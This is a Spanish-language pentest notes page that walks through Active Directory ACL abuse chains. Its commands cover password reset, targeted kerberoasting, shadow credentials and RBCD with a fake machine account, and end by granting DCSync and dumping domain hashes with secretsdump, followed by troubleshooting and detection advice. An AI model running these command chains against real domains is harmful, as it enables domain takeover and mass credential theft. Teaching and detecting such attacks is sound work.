---
title: Cadenas de ACL en AD — de GenericAll a DCSync
tags: [windows, active-directory, acl, genericall, rbcd, kerberoasting, dcsync]
---

# ACL en Active Directory: la cadena, no el salto

[🇬🇧 English](ad-acl-chains.en.md) | **Español**

## 1. Leer las ACL antes de tocar nada

```bash
bloodhound-python -u <USER> -p '<PASSWORD>' -d <DOMAIN> -ns <DC_IP> -c All
dacledit.py -action read -target '<TARGET>' -principal '<USER>' <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip <DC_IP>
bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --host <DC_IP> get object '<TARGET>'
```

BloodHound responde la pregunta correcta: **qué camino más corto existe desde mi principal hasta Tier 0**. Cada ACE tiene un efecto distinto según el tipo de objeto.

| ACE | Sobre usuario | Sobre equipo |
|---|---|---|
| `GenericAll` | reset de contraseña, SPN, shadow credentials | RBCD, LAPS, todos los atributos |
| `GenericWrite` | SPN (targeted kerberoast), shadow credentials | RBCD |
| `ForceChangePassword` | reset sin conocer la actual | — |
| `WriteDACL` | concederse `GenericAll` o `DCSync` | igual |
| `WriteOwner` | tomar propiedad → `WriteDACL` | igual |

## 2. GenericAll sobre un usuario

Tres caminos, de menos a más ruidoso:

```bash
# 1) reset directo
net rpc password '<TARGET>' '<NEW_PASSWORD>' -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>

# 2) SPN y kerberoast (targeted)
bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --host <DC_IP> set object '<TARGET>' servicePrincipalName -v 'fake/spn.<DOMAIN>'
impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -request -outputfile roast.txt

# 3) shadow credentials
certipy shadow add -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -target '<TARGET>'
```

El targeted kerberoast solo funciona si la cuenta tiene SPN: se lo pone el atacante con `GenericWrite`/`GenericAll`. El TGS sale en RC4 (`etype 23`) y se rompe con `hashcat -m 13100`.

## 3. GenericAll sobre un equipo → RBCD

`msDS-AllowedToActOnBehalfOfOtherIdentity` es el atributo que define quién puede delegar **hacia** ese equipo. Escribirlo permite S4U2Self + S4U2Proxy hacia cualquier servicio del host, incluido `cifs` como Administrator.

```bash
# equipo controlado (necesita cuota de máquina o permisos de creación)
impacket-addcomputer '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> \
  -computer-name 'FAKE$' -computer-pass '<MACHINE_PASSWORD>'

# escribir el atributo en el objetivo
impacket-rbcd -delegate-from 'FAKE$' -delegate-to '<TARGET>$' -action write \
  '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>

# pedir el servicio como Administrator
impacket-getST -spn 'cifs/<TARGET>.<DOMAIN>' -impersonate Administrator \
  '<DOMAIN>/FAKE$:<MACHINE_PASSWORD>' -dc-ip <DC_IP>
```

Con el `.ccache`, `KRB5CCNAME=Administrator.ccache` y `impacket-secretsdump -k -no-pass <TARGET>`.

## 4. De escritura a DCSync

`DCSync` no es un privilegio especial: es tener `DS-Replication-Get-Changes` y `DS-Replication-Get-Changes-All` sobre el objeto del dominio. `WriteDACL` sobre el dominio permite concedérselos:

```bash
dacledit.py -action write -rights DCSync -principal '<USER>' -target-dn 'DC=<DOMAIN>,DC=<TLD>' \
  '<DOMAIN>/<USER>:'<PASSWORD>' -dc-ip <DC_IP>
impacket-secretsdump -just-dc '<DOMAIN>/<USER>:<PASSWORD>@<DC_FQDN>'
```

## 5. Errores típicos

- **`Could not find the base DN`** → usa `-target-dn` con el DN completo o `-target '<DOMINIO>'` con la sintaxis de dacledit.
- **RBCD falla al escribir** → falta `GenericWrite`/`GenericAll` sobre el equipo, o el objeto es un DC (RBCD a un DC requiere privilegios extra).
- **`getST` devuelve `KDC_ERR_BADOPTION`** → el SPN no existe en el objetivo o el atributo no se replicó; espera unos segundos o usa otro servicio (`http`, `host`).
- **El hash no rompe** → la cuenta es AES-only; `-m 19700` o pide el ticket con `-aes`.
- **El reset rompe el acceso** → cambiaste la contraseña de una cuenta en uso; documenta y restaura.

## 6. Detección y mitigación

- Auditar ACEs peligrosas en objetos Tier 0 y en OUs con herencia; revisar `AdminSDHolder` y `Domain Admins`.
- Alertar de 4662 sobre el dominio con `DS-Replication-Get-Changes-All`, de 4720/4738 y de 4769 con RC4 en cuentas de usuario.
- Limitar la cuota de creación de equipos (`ms-DS-MachineAccountQuota`) a 0 salvo necesidad.
- Revisar `msDS-AllowedToActOnBehalfOfOtherIdentity` de todos los equipos y vaciarlo donde no toque.

MITRE: T1098, T1134.001, T1558.003, T1003.006.
